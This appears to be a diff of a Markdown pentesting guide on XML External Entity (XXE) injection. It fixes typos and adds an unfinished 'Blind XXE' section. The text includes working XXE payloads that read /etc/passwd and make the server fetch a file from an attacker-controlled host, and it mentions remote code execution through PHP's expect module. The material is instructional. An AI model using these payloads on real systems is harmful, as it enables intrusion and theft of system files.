@@ -68,7 +68,7 @@ So if an application receives XML to the server the attacker might be able to ex
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
-The elemet can be whatever, it doesn't matter. The xxe is the "variable" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd. SYSTEM means that what is to be included can be found locally on the filesystem.
+The element can be anything, it's simply used to set up the tags. The xxe is the "variable" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd. SYSTEM means that what is to be included can be found locally on the filesystem.
 
 In php-applications where the expect module is loaded it is possible to get RCE. It is not a very common vulnerability, but still good to know.
 
@@ -100,11 +100,15 @@ If "testdata" gets reflected then it is vulnerable to XXE. If it gets reflected 
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
-Another way to test it is to see if the server tries to download the external script. Firs t you need to set up your own webserver, and then wait for it to connect.
+Another way to test it is to see if the server tries to download the external script. First you need to set up your own webserver, and then wait for it to connect.
 
 ```
 <!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://192.168.1.101/fil.txt">]><test>&xxe;</test>
 ```
+
+## Blind XXE
+
+In some cases, you won't receive any output from the 
 
 ### Exfiltrate data through URL
 
